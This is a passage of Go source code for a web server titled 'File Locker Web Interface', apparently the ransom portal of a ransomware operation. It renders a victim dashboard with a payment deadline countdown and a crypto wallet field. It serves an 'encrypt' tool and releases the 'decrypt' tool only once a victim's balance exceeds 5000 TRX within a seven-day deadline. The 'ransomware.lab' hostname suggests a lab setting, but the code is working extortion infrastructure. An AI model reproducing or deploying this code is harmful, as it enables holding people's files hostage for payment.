							<span class="countdown-label">Days</span>
						</div>
						<div class="countdown-item">
							<span id="hours" class="countdown-value` + func() string {
		if countdownGreen {
			return " green"
		}
		return ""
	}() + `">--</span>
							<span class="countdown-label">Hours</span>
						</div>
						<div class="countdown-item">
							<span id="minutes" class="countdown-value` + func() string {
		if countdownGreen {
			return " green"
		}
		return ""
	}() + `">--</span>
							<span class="countdown-label">Minutes</span>
						</div>
						<div class="countdown-item">
							<span id="seconds" class="countdown-value` + func() string {
		if countdownGreen {
			return " green"
		}
		return ""
	}() + `">--</span>
							<span class="countdown-label">Seconds</span>
						</div>
					</div>
					<div id="expiredMessage" class="countdown-expired" style="display: none;">
						⚠️ Deadline has expired!
					</div>
				</div>

				` + updateWalletHtml + `

				<div class="update-section">
					<h3>🔓 Decrypt Tool</h3>
					<p style="font-size: 13px; color: #666; margin-bottom: 15px;">Download the decrypt tool to unlock your encrypted files.</p>
					` + downloadButtonHtml + `
				</div>
			</div>
		</div>

		<div class="button-group">
			<button type="button" class="btn-logout" onclick="logout()">
				Logout
			</button>
		</div>
	</div>

	<div id="toast" class="toast"></div>
<script>
	const deadlineTimestamp = ` + fmt.Sprintf("%d", deadlineTimestamp) + `;
	const countdownGreen = ` + fmt.Sprintf("%t", countdownGreen) + `;

	function updateCountdown() {
		if (deadlineTimestamp === 0) {
			document.getElementById('countdown').innerHTML = '<div style="text-align: center; padding: 20px; color: #999;">No deadline set</div>';
			return;
		}

		if (countdownGreen) {
			document.getElementById('days').textContent = '00';
			document.getElementById('hours').textContent = '00';
			document.getElementById('minutes').textContent = '00';
			document.getElementById('seconds').textContent = '00';
			return;
		}

		const now = new Date().getTime();
		const distance = deadlineTimestamp - now;

		if (distance < 0) {
			document.getElementById('countdown').style.display = 'none';
			document.getElementById('expiredMessage').style.display = 'block';
			return;
		}

		const days = Math.floor(distance / (1000 * 60 * 60 * 24));
		const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
		const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
		const seconds = Math.floor((distance % (1000 * 60)) / 1000);

		document.getElementById('days').textContent = days.toString().padStart(2, '0');
		document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
		document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
		document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
	}

	updateCountdown();
	setInterval(updateCountdown, 1000);

	function copyToClipboard(text, message) {
		navigator.clipboard.writeText(text).then(() => {
			showToast(message || 'Copied!');
		}).catch(() => {
			alert('Failed to copy to clipboard');
		});
	}

	function copyMachineId() {
		const machineId = document.getElementById('machineIdValue').textContent;
		copyToClipboard(machineId, 'Machine ID copied!');
	}

	function copyPasswordHash() {
		const passwordHash = document.getElementById('passwordHashValue').textContent;
		copyToClipboard(passwordHash, 'Password Hash copied!');
	}

	function copyWalletAddress() {
		const walletAddress = document.getElementById('walletAddressValue').textContent;
		copyToClipboard(walletAddress, 'Wallet Address copied!');
	}

	function updateWalletInfo() {
		const walletAddress = document.getElementById('updateWalletAddress').value.trim();
		const updateMessage = document.getElementById('updateMessage');

		if (!walletAddress) {
			updateMessage.style.color = '#c33';
			updateMessage.textContent = 'Wallet address cannot be empty';
			updateMessage.style.display = 'block';
			return;
		}

		fetch('/api/update-wallet', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				machineId: '` + machineID + `',
				walletAddress: walletAddress
			})
		})
		.then(res => res.json())
		.then(data => {
			if (data.success) {
				updateMessage.style.color = '#3c3';
				updateMessage.textContent = '✓ Wallet address updated successfully';
				document.getElementById('walletAddressValue').textContent = walletAddress;
				if (data.balance) {
					document.getElementById('balanceValue').textContent = data.balance;
				}
			} else {
				updateMessage.style.color = '#c33';
				updateMessage.textContent = 'Error: ' + (data.error || 'Failed to update');
			}
			updateMessage.style.display = 'block';
		})
		.catch(err => {
			updateMessage.style.color = '#c33';
			updateMessage.textContent = 'Error: ' + err.message;
			updateMessage.style.display = 'block';
		});
	}

	function downloadDecrypt() {
		window.location.href = '/download/decrypt?machineId=' + encodeURIComponent('` + machineID + `');
	}

	function logout() {
		window.location.href = '/';
	}

	function showToast(message) {
		const toast = document.getElementById('toast');
		toast.textContent = message;
		toast.classList.add('show');
		setTimeout(() => {
			toast.classList.remove('show');
		}, 2000);
	}
</script>
</html>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, html)
}

func downloadEncryptHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Download encrypt request from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)

	encryptPath := resolveEncryptPath()

	if _, err := os.Stat(encryptPath); os.IsNotExist(err) {
		http.Error(w, "Encrypt file not found", http.StatusNotFound)
		return
	}

	fileData, err := os.ReadFile(encryptPath)
	if err != nil {
		http.Error(w, "Failed to read encrypt file", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[%s] Encrypt tool downloaded\n", time.Now().Format("2006-01-02 15:04:05"))
	w.Header().Set("Content-Disposition", "attachment; filename=encrypt")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(fileData)))

	w.Write(fileData)
}

func downloadDecryptHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Download decrypt request from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)
	machineID := r.URL.Query().Get("machineId")
	if machineID == "" {
		http.Error(w, "Machine ID is required", http.StatusBadRequest)
		return
	}

	loginData, err := getLogin(machineID)
	if err != nil {
		http.Error(w, "Failed to verify access", http.StatusInternalServerError)
		return
	}

	if loginData == nil {
		http.Error(w, "Machine ID not found", http.StatusNotFound)
		return
	}

	if loginData.Balance <= 5000 {
		fmt.Printf("[%s] Download blocked - Insufficient balance for Machine ID: %s (Balance: %.8f TRX)\n", time.Now().Format("2006-01-02 15:04:05"), machineID, loginData.Balance)
		http.Error(w, "Insufficient balance. Minimum 5000 TRX required to download decrypt tool", http.StatusForbidden)
		return
	}

	deadline := loginData.CreatedAt.Add(7 * 24 * time.Hour)
	if time.Now().After(deadline) {
		fmt.Printf("[%s] Download blocked - Deadline expired for Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)
		http.Error(w, "Deadline has expired. You can no longer download the decrypt tool", http.StatusForbidden)
		return
	}

	decryptPath := resolveDecryptPath()

	if _, err := os.Stat(decryptPath); os.IsNotExist(err) {
		http.Error(w, "Decrypt file not found", http.StatusNotFound)
		return
	}

	fileData, err := os.ReadFile(decryptPath)
	if err != nil {
		http.Error(w, "Failed to read decrypt file", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[%s] Decrypt tool downloaded by Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)
	w.Header().Set("Content-Disposition", "attachment; filename=decrypt")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(fileData)))

	w.Write(fileData)
}

func main() {
	addr := ":80"

	if err := initDB(); err != nil {
		fmt.Printf("⚠️ Warning: Database initialization failed: %v\n", err)
		fmt.Println("⚠️ Login data will not be saved to database")
	} else {
		fmt.Println("✓ Database initialized successfully")
	}
	defer func() {
		if db != nil {
			db.Close()
		}
	}()

	http.HandleFunc("/", loginHandler)
	http.HandleFunc("/api/login", apiLoginHandler)
	http.HandleFunc("/api/update-wallet", updateWalletHandler)
	http.HandleFunc("/dashboard", dashboardHandler)
	http.HandleFunc("/generate", generatePasswordHandler)
	http.HandleFunc("/download/encrypt", downloadEncryptHandler)
	http.HandleFunc("/download/decrypt", downloadDecryptHandler)

	fmt.Printf("🚀 File Locker Web Interface listening on port: %s\n", addr)
	fmt.Println("📖 Open http://ransomware.lab/ in your browser")

	if err := http.ListenAndServe(addr, nil); err != nil {
		panic(err)
	}
}
